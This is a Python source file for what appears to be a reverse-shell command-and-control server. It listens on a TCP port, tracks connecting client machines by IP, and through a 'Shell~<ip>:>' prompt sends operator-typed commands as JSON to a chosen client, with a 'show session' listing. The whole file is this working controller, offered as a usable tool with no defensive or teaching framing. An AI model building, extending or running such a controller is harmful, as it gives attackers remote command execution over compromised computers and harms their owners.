import subprocess
import socket
import threading
import json
import os
import sys

# Get the absolute path of the project's root directory
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Add the project root to the Python module search path
sys.path.append(project_root)


from Logs.LogsHandler import log_Handler

# logs
logterminal = log_Handler()


def print_thread_count():
    thread_count = threading.active_count()
    logterminal.write(f"[+] Number of active threads: {thread_count-1}")


class Server:
    def __init__(self, IP, PORT) -> None:
        # Initialize the sockets
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((IP, PORT))
        self.server.listen(10)
        self.serverIP = IP
        self.serverPORT = PORT
        # List of clients
        self.ip_to_socket_map = {}
        self.control_Thread = None
        self.current_Client = None
        self.stop_event = threading.Event()
        self.byt = 1024 * 10

    # MUJI HANDLE CLIENT
    def handle_Clients(self):
        # LOGIC TO HANDLE CLIENTS
        if self.current_Client == None:
            return
        # TRUE = self.current_Client != None and self.control_Thread != None
        while (
            self.current_Client != None and self.control_Thread != None
        ):  # this our custom check
            try:
                # getting the user command
                print(f"Shell~{self.current_Client}:> ", end="")
                command = input()

                if command.strip() == "":
                    continue

                # logic to handle command
                print(command)
                if command.lower() == "show session":
                    # show avaiable sessions
                    for ip in self.ip_to_socket_map:
                        print(self.ip_to_socket_map[ip])
                    continue
                self.send_Message(
                    self.ip_to_socket_map[self.current_Client],
                    command,
                    self.current_Client,
                )

            except Exception as ex:
                logterminal.write(
                    f"[+] SOMETHING WENT WRONG IN HANDLE CLIENT COMMUNICATION {str(ex)}"
                )

    
    
    # message Generator
    def generate_Message(self, msg):
        try:
            jsondata = json.dumps(msg)
            return jsondata.encode()
        except Exception as ex:
            logterminal.write(f"[-] generate message error :{str(ex)}")
            return ""

    # send message
    def send_Message(self, clientsocket: socket.socket, command, current_clientip):
        try:
            clientsocket.send(self.generate_Message(command))
        except Exception as ex:
            logterminal.write(
                f"[-]SOMETHING WENT WRONG WHILE SENDING MESSAGE :{str(ex)}"
            )
            # remove the existing client if the communication has failed
            if self.ip_to_socket_map.get(current_clientip) != None:
                self.ip_to_socket_map.pop(current_clientip)

            # check if there are other avaiable sessions if not we stop the handleclient thread execution
            if len(self.ip_to_socket_map) == 0:
                # remove the sockets and empty the thread
                clientsocket.close()
                self.control_Thread = None
                self.current_Client = None
                logterminal.write(f"[+] NO ACTIVE SESSIONS")
                print_thread_count()

    # received_Message
    def receive_Message(self, clientsocket: socket.socket):
        data = ""
        while True:
            try:
                data = data + clientsocket.recv(self.byt).decode().rstrip()
                return json.loads(data)
            except Exception as ex:
                logterminal.write(
                    f"[-]SOMETHING WENT WRONG WHILE RECEIVING MESSAGE:{str(ex)}"
                )
                return data

    def start(self):
        # LOGIC FOR THE SERVER
        logterminal.write(f"[+] Server listening on {self.serverIP}:{self.serverPORT}")
        while True:
            try:
                logterminal.write(f"[+] WAITING FOR INCOMING REQUESTS")
                client, address = self.server.accept()
                logterminal.write(
                    f"[+] CLIENT CONNECTED FROM {address[0]}:{address[1]}"
                )
                print_thread_count()
                # append the client to the list of clients only once from the same ip
                if self.ip_to_socket_map.get(address[0]) == None:
                    self.ip_to_socket_map[address[0]] = client

                if self.current_Client == None and self.control_Thread == None:
                    # logic to control the clients
                    logterminal.write(
                        f"[+] Starting a New Thread to control the clients"
                    )
                    self.current_Client = address[0]
                    self.control_Thread = threading.Thread(target=self.handle_Clients)
                    self.control_Thread.start()
                else:
                    # logic to handle another client joined
                    pass

            except Exception as ex:
                print(f"[-] SOMETHING WENT WRONG IN START _SERVER {str(ex)}")
                print(f"[-] CLOSING DOWN THE SERVER")
                # TO DO if there are any active connections before closing down the server close those connections
                exit()


def main():
    if len(sys.argv) != 3:
        print("[+] Usage python ./server.py IP PORT")
        print("[+] Example python ./server.py 192.168.0.151 8000")
        return
    # EXTRACT IP_ADDRESS
    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])
    server = Server(IP_ADDRESS, PORT)
    server.start()


if __name__ == "__main__":
    main()
